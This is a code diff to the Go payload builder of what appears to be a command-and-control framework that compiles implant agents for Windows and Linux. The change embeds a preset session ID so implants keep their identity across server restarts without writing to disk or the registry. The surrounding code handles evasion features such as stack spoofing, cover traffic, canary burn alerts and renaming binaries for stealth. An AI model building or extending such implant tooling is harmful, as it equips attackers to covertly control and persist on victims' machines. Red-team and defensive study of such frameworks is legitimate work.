@@ -96,6 +96,11 @@ type BuildConfig struct {
 	CoverTraffic bool `json:"cover_traffic"`
 	// DNS canary domain — unique per payload; resolution detected server-side as burn alert
 	CanaryDomain string `json:"canary_domain,omitempty"`
+
+	// PresetID is generated server-side before compilation and embedded in the binary.
+	// When the agent connects it sends this as ResumeID so the server restores the same
+	// session even after a server restart — without touching disk or registry.
+	PresetID string `json:"preset_id,omitempty"`
 }
 
 // ── Build functions ───────────────────────────────────────────────────────────
@@ -664,6 +669,10 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 	if cfg.StackSpoof {
 		args = append(args, "-DAGENT_STACK_SPOOF=1")
 	}
+	// Embed preset agent ID for persistent identity across server restarts.
+	if cfg.PresetID != "" {
+		args = append(args, fmt.Sprintf(`-DAGENT_PRESET_ID="%s"`, cfg.PresetID))
+	}
 	args = append(args, sources...)
 	args = append(args, "-lwinhttp", "-lbcrypt", "-lws2_32", "-lcrypt32", "-lsecur32", "-lgdi32", "-lole32", "-loleaut32")
 
@@ -771,6 +780,10 @@ func BuildCAgentDLL(cfg BuildConfig, outDir string) (string, error) {
 	}
 	if cfg.StackSpoof {
 		args = append(args, "-DAGENT_STACK_SPOOF=1")
+	}
+	// Embed preset agent ID for persistent identity across server restarts.
+	if cfg.PresetID != "" {
+		args = append(args, fmt.Sprintf(`-DAGENT_PRESET_ID="%s"`, cfg.PresetID))
 	}
 	args = append(args, sources...)
 	args = append(args, "-lwinhttp", "-lbcrypt", "-lws2_32", "-lcrypt32", "-lsecur32", "-lgdi32", "-lole32", "-loleaut32")
@@ -1397,6 +1410,9 @@ func BuildCAgentLinux(cfg BuildConfig, outDir string) (string, error) {
 		fmt.Sprintf("AGENT_PARENT_ID=%s", cfg.ParentID),
 		"TARGET=" + outPath,
 	}
+	if cfg.PresetID != "" {
+		args = append(args, fmt.Sprintf("AGENT_PRESET_ID=%s", cfg.PresetID))
+	}
 
 	cmd := exec.Command("make", args...)
 	cmd.Dir = agentDir
@@ -1612,6 +1628,10 @@ func buildLDFlags(cfg BuildConfig) string {
 	// Embed the canonical build filename so the agent reports its build label as process_name
 	// even when renamed on disk (e.g. deployed as agent.exe for stealth).
 	add("BuildName", agentName(cfg, ".exe"))
+	// Embed the preset agent ID so the agent can resume its identity after a server restart.
+	if cfg.PresetID != "" {
+		add("AgentPresetID", cfg.PresetID)
+	}
 	return strings.Join(flags, " ")
 }
 
